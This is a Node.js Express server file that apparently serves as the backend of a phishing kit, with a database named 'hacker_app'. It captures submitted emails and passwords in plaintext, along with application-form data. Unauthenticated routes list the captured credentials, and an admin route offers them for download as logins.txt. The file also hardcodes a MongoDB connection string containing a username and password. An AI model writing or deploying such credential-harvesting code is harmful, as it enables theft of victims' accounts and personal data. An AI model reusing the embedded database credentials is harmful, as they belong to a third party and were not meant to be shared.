const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (optional)
app.use(express.static(path.join(__dirname, '../')));

//
// ✅ STEP 1: Connect to MongoDB Atlas (using hacker_app database)
//
const MONGO_URI = "mongodb+srv://samsmollett:adikah1234@cluster0.s8ofap9.mongodb.net/hacker_app?retryWrites=true&w=majority";

mongoose.connect(MONGO_URI)
  .then(() => console.log("✅ Connected to MongoDB Atlas (hacker_app)"))
  .catch((err) => console.error("❌ MongoDB connection error:", err));

//
// ✅ STEP 2: Define Schemas and Models
//
const loginSchema = new mongoose.Schema({
  email: String,
  password: String,
  createdAt: { type: Date, default: Date.now }
});

const applicationSchema = new mongoose.Schema({
  form: Object,
  createdAt: { type: Date, default: Date.now }
});

const Login = mongoose.model('Login', loginSchema);
const Application = mongoose.model('Application', applicationSchema);

//
// ✅ STEP 3: Save login info to MongoDB
//
app.post('/save-login', async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password)
    return res.status(400).send({ error: 'Missing email or password' });

  try {
    await Login.create({ email, password });
    console.log(`[LOGIN SAVED] ${new Date().toISOString()} email=${email}`);
    res.send({ status: 'ok' });
  } catch (err) {
    console.error("❌ Error saving login:", err);
    res.status(500).send({ error: 'Database error' });
  }
});

//
// ✅ STEP 4: Save application form to MongoDB
//
app.post('/save-application', async (req, res) => {
  try {
    await Application.create({ form: req.body });
    console.log("[APPLICATION SAVED]");
    res.send({ status: 'ok' });
  } catch (err) {
    console.error("❌ Error saving application:", err);
    res.status(500).send({ error: 'Database error' });
  }
});

//
// ✅ STEP 5: View saved logins
//
app.get('/logins', async (req, res) => {
  try {
    const logins = await Login.find().sort({ createdAt: -1 });
    const formatted = logins.map(l => `Email: ${l.email}, Password: ${l.password}`).join('\n');
    res.send(`<pre>${formatted}</pre>`);
  } catch (err) {
    res.status(500).send('Error loading logins');
  }
});

//
// ✅ STEP 6: View saved applications
//
app.get('/applications', async (req, res) => {
  try {
    const apps = await Application.find().sort({ createdAt: -1 });
    res.send(`<pre>${JSON.stringify(apps, null, 2)}</pre>`);
  } catch (err) {
    res.status(500).send('Error loading applications');
  }
});

//
// ✅ STEP 7: Secure admin-only download route
//
const ADMIN_TOKEN = process.env.ADMIN_TOKEN;

app.get('/admin/download-login-file', async (req, res) => {
  const token = req.headers['x-admin-token'] || req.query.token;
  if (!ADMIN_TOKEN || token !== ADMIN_TOKEN) {
    return res.status(401).send('Unauthorized');
  }

  try {
    const logins = await Login.find().sort({ createdAt: -1 });
    const content = logins.map(l => `Email: ${l.email}, Password: ${l.password}`).join('\n');
    res.setHeader('Content-Disposition', 'attachment; filename=logins.txt');
    res.setHeader('Content-Type', 'text/plain');
    res.send(content);
  } catch (err) {
    console.error('❌ Error generating file:', err);
    res.status(500).send('Server error');
  }
});

//
// ✅ STEP 8: Debug route to view MongoDB data in console
//
app.get('/debug', async (req, res) => {
  try {
    const logins = await Login.find().sort({ createdAt: -1 });
    const applications = await Application.find().sort({ createdAt: -1 });

    console.log("---- LOGINS ----");
    console.log(logins);

    console.log("---- APPLICATIONS ----");
    console.log(applications);

    res.send({ status: 'ok', message: 'Check server logs for MongoDB data' });
  } catch (err) {
    console.error("❌ Error fetching data:", err);
    res.status(500).send({ error: 'Database error' });
  }
});

//
// ✅ STEP 9: Start the server
//
app.listen(3000, () => console.log('✅ Server running at http://localhost:3000'));





